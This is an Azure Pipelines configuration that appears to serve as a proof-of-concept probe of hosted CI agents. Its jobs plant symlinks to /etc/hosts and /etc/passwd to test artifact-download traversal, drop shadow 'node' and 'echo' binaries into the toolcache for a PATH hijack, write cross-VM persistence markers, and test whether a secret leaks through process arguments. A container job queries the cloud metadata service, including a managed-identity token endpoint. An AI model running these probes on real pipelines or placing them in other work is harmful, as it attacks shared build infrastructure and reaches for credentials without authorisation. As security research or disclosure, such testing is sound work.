# azure-pipelines.yml
# One file that plants probes, publishes artifacts, and verifies impact in fresh jobs.
# Focus areas:
#  - Toolcache persistence & PATH hijack attempt
#  - Artifact downloader symlink / traversal behavior
#  - Secret-in-argv leakage probe
#  - IMDS reachability from a containerized job
# All steps are self-contained and publish small artifacts as proof.

trigger:
- main

pr:
- main

variables:
  VM_IMAGE: 'ubuntu-22.04'
  # Unique run marker to correlate artifacts across jobs in this same pipeline run
  RUN_MARK: 'MARK_$(Build.BuildId)_$(System.JobAttempt)'

stages:
- stage: VulnProbes
  displayName: Forensics & Probes
  jobs:

  # -----------------------------
  # JOB 1: Seed + publish artifacts
  # -----------------------------
  - job: seed_and_publish
    displayName: "Seed: toolcache, symlinks, and argv leak"
    pool:
      vmImage: $(VM_IMAGE)
    steps:
      - bash: |
          set -euo pipefail
          echo "== Host identity & timing =="
          date -u
          uname -a
          id
          echo "== /etc fingerprints =="
          echo "--- /etc/machine-id ---"; cat /etc/machine-id || true
          echo "--- /etc/os-release ---"; sed -n '1,200p' /etc/os-release || true
          echo
          echo "== Prepare artifacts tree =="
          rm -rf artifacts-* || true
          mkdir -p artifacts-symlink artifacts-argv artifacts-toolcache artifacts-seed
          echo "$(RUN_MARK) $(Build.QueuedBy) $(Build.SourceVersion)" | tee artifacts-seed/run_mark.txt

          echo
          echo "== Symlink payloads (safe targets) =="
          # Absolute symlink pointing to host file (harmless on its own, used to test downloader behavior)
          ln -s /etc/hosts artifacts-symlink/abs_to_etc_hosts
          # Relative symlink pointing up out of extraction directory (if downloader honors raw symlinks)
          mkdir -p artifacts-symlink/deep/inside
          ( cd artifacts-symlink/deep/inside && ln -s ../../../../etc/passwd rel_escape_to_etc_passwd )
          # A file whose NAME looks traversal-ish (but is just a name in FS)
          touch 'artifacts-symlink/..__not_traversal__'

          echo
          echo "== Toolcache seed & PATH-hijack attempt =="
          echo "AGENT_TOOLSDIRECTORY=${AGENT_TOOLSDIRECTORY:-/opt/hostedtoolcache}"
          TC_DIR="${AGENT_TOOLSDIRECTORY:-/opt/hostedtoolcache}"
          SHADOW_DIR="$TC_DIR/shadow/bin"
          mkdir -p "$SHADOW_DIR"
          # Drop 'node' and 'echo' wrappers that log invocation to a file if ever executed
          cat > "$SHADOW_DIR/node" <<'EOF'
          #!/usr/bin/env bash
          echo "[shadow-node] invoked: $0 $*" >> "$HOME/shadow-invocations.log"
          # behave enough like node to not explode most calls
          if command -v /usr/bin/node >/dev/null 2>&1; then exec /usr/bin/node "$@"; else exec node "$@"; fi
          EOF
          cat > "$SHADOW_DIR/echo" <<'EOF'
          #!/usr/bin/env bash
          printf "hello-from-shadow "
          exec /usr/bin/echo "$@"
          EOF
          chmod +x "$SHADOW_DIR/node" "$SHADOW_DIR/echo"

          # Write presence markers in a few common locations
          for p in /var/tmp /tmp "$TC_DIR" /usr/local/share ; do
            fn="$p/.${RUN_MARK}"
            (echo "${RUN_MARK} $(date -u +%FT%TZ)" > "$fn" 2>/dev/null && echo "wrote $fn") || echo "no perms for $p"
          done

          # Save proof of world-writable perms for the toolcache
          (ls -ld "$TC_DIR" && ls -la "$TC_DIR") > artifacts-toolcache/toolcache_listing.txt

          echo
          echo "== Secret-argv leak probe setup =="
          # If DUMMY_SECRET isn't pre-set in pipeline, generate one and mark as secret for subsequent steps
          if [ -z "${DUMMY_SECRET:-}" ]; then
            gen="dummy-$(openssl rand -hex 8 || date +%s%N)"
            echo "##vso[task.setvariable variable=DUMMY_SECRET;issecret=true]$gen"
            echo "(Set runtime secret DUMMY_SECRET)"
          else
            echo "(Using pre-provided DUMMY_SECRET)"
          fi
        displayName: "Seed: identify, symlinks, toolcache, and secret init"

      - task: PublishPipelineArtifact@1
        displayName: "Publish: toolcache proof"
        inputs:
          targetPath: artifacts-toolcache
          artifactName: toolcache-proof
          publishLocation: pipeline

      - task: PublishPipelineArtifact@1
        displayName: "Publish: symlink payloads"
        inputs:
          targetPath: artifacts-symlink
          artifactName: symlink-proof
          publishLocation: pipeline

      - bash: |
          set -euo pipefail
          echo "== First-party-style argv exposure check =="
          echo "Marker: ARGV_LEAK_$(Build.BuildId)_$$" | tee artifacts-argv/marker.txt

          # Spawn a short-lived process that includes the secret in ARGV (simulates a task passing secrets via args)
          # NOTE: Doing this intentionally to test if /proc reveals the value while the process runs.
          if [ -z "${DUMMY_SECRET:-}" ]; then
            echo "No DUMMY_SECRET available; skipping argv test." | tee -a artifacts-argv/argv.txt
            exit 0
          fi

          # Run a child bash with the secret as an argument; in parallel, scan /proc for it.
          ( sleep 0.5; ps -eo pid,ppid,user,cmd | tee artifacts-argv/ps_snapshot.txt | grep -F -- "$DUMMY_SECRET" && echo "FOUND in ps" | tee -a artifacts-argv/argv.txt || echo "NOT_FOUND in ps" | tee -a artifacts-argv/argv.txt ) &

          /usr/bin/bash -c 'sleep 2' "${DUMMY_SECRET}" || true

          # Also check /proc/<pid>/cmdline style for any survivors
          for pid in $(pgrep -f sleep || true); do
            tr '\0' ' ' < /proc/$pid/cmdline | tee -a artifacts-argv/cmdlines.txt || true
          done

          echo "Done."
        displayName: "Probe: secret present in ARGV?"
        env:
          DUMMY_SECRET: $(DUMMY_SECRET)

      - task: PublishPipelineArtifact@1
        displayName: "Publish: argv-leak artifacts"
        inputs:
          targetPath: artifacts-argv
          artifactName: argv-leak-proof
          publishLocation: pipeline

  # ------------------------------------
  # JOB 2: Fresh VM — test downloader & symlink handling
  # ------------------------------------
  - job: download_and_validate
    displayName: "Validate: artifact download behavior (symlinks/traversal)"
    dependsOn: seed_and_publish
    pool:
      vmImage: $(VM_IMAGE)
    steps:
      - task: DownloadPipelineArtifact@2
        displayName: "Download symlink-proof"
        inputs:
          buildType: 'current'
          artifactName: 'symlink-proof'
          targetPath: 'dl-symlink'

      - bash: |
          set -euo pipefail
          echo "== Inspect downloaded files =="
          mkdir -p artifacts-verify
          ( set -x
            ls -lR dl-symlink | sed -n '1,300p' | tee artifacts-verify/ls_dl.txt
            file dl-symlink/* || true
            # Show what the symlinks point to (if created as symlinks)
            for f in dl-symlink/* dl-symlink/**/rel_escape_to_etc_passwd 2>/dev/null; do
              [ -L "$f" ] && echo "$f -> $(readlink -f "$f")" | tee -a artifacts-verify/readlinks.txt || true
            done
            # Attempt to read through the symlink (this would read THIS VM's host file if symlink is honored)
            for f in dl-symlink/abs_to_etc_hosts dl-symlink/deep/inside/rel_escape_to_etc_passwd ; do
              if [ -e "$f" ]; then
                echo "--- BEGIN $f ---" | tee -a artifacts-verify/cat_results.txt
                (cat "$f" | head -n 10 || true) | tee -a artifacts-verify/cat_results.txt
                echo "--- END $f ---" | tee -a artifacts-verify/cat_results.txt
              else
                echo "Missing $f" | tee -a artifacts-verify/cat_results.txt
              fi
            done
          )
        displayName: "Check if downloader restored symlinks and if they dereference"

      - task: PublishPipelineArtifact@1
        displayName: "Publish: downloader verification"
        inputs:
          targetPath: artifacts-verify
          artifactName: symlink-download-proof
          publishLocation: pipeline

  # ------------------------------------
  # JOB 3: Fresh VM — persistence & toolcache hijack check
  # ------------------------------------
  - job: persistence_check
    displayName: "Validate: cross-VM persistence & PATH hijack feasibility"
    dependsOn: seed_and_publish
    pool:
      vmImage: $(VM_IMAGE)
    steps:
      - bash: |
          set -euo pipefail
          echo "== Check for persisted markers from previous job on a fresh VM =="
          mkdir -p artifacts-persist
          TC_DIR="${AGENT_TOOLSDIRECTORY:-/opt/hostedtoolcache}"
          for p in /var/tmp /tmp "$TC_DIR" /usr/local/share ; do
            fn="$p/.${RUN_MARK}"
            if [ -f "$fn" ]; then
              echo "FOUND $fn" | tee -a artifacts-persist/findings.txt
            else
              echo "NOT_FOUND $fn" | tee -a artifacts-persist/findings.txt
            fi
          done

          echo
          echo "== Try PATH hijack using toolcache/shadow if it exists =="
          if [ -d "$TC_DIR/shadow/bin" ]; then
            export PATH="$TC_DIR/shadow/bin:$PATH"
            echo "PATH prepended with $TC_DIR/shadow/bin" | tee -a artifacts-persist/findings.txt
            # If our shadow 'echo' exists, we should see the marker
            echo "invocation-test" | tee -a artifacts-persist/echo_out.txt
            # If 'node' is shadowed, this will log into $HOME/shadow-invocations.log
            ( node -v || true ) | tee -a artifacts-persist/node_out.txt
            [ -f "$HOME/shadow-invocations.log" ] && cp "$HOME/shadow-invocations.log" artifacts-persist/ || true
          else
            echo "No shadow bin dir present." | tee -a artifacts-persist/findings.txt
          fi
        displayName: "Probe: persistence & PATH hijack"

      - task: PublishPipelineArtifact@1
        displayName: "Publish: persistence findings"
        inputs:
          targetPath: artifacts-persist
          artifactName: persistence-proof
          publishLocation: pipeline

  # ------------------------------------
  # JOB 4: Run inside a container and probe IMDS
  # ------------------------------------
  - job: imds_from_container
    displayName: "Probe: IMDS reachability from job container"
    dependsOn: seed_and_publish
    pool:
      vmImage: $(VM_IMAGE)
    container: ubuntu:22.04
    steps:
      - bash: |
          set -euo pipefail
          apt-get update -qq
          DEBIAN_FRONTEND=noninteractive apt-get install -y -qq curl ca-certificates >/dev/null
          mkdir -p artifacts-imds
          echo "== IMDS instance query (should be blocked or require header) ==" | tee -a artifacts-imds/imds.txt
          set +e
          curl -i -s --max-time 2 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | sed -n '1,80p' | tee -a artifacts-imds/imds.txt
          echo
          echo "== IMDS with Metadata:true header ==" | tee -a artifacts-imds/imds.txt
          curl -i -s -H "Metadata: true" --max-time 3 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | sed -n '1,120p' | tee -a artifacts-imds/imds.txt
          echo
          echo "== MSI token probe (likely 400/401 if no identity) ==" | tee -a artifacts-imds/imds.txt
          curl -i -s -H "Metadata: true" --max-time 3 \
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" \
            | sed -n '1,80p' | tee -a artifacts-imds/imds.txt
          set -e
        displayName: "IMDS inside container"

      - task: PublishPipelineArtifact@1
        displayName: "Publish: IMDS container probe"
        inputs:
          targetPath: artifacts-imds
          artifactName: imds-container-proof
          publishLocation: pipeline
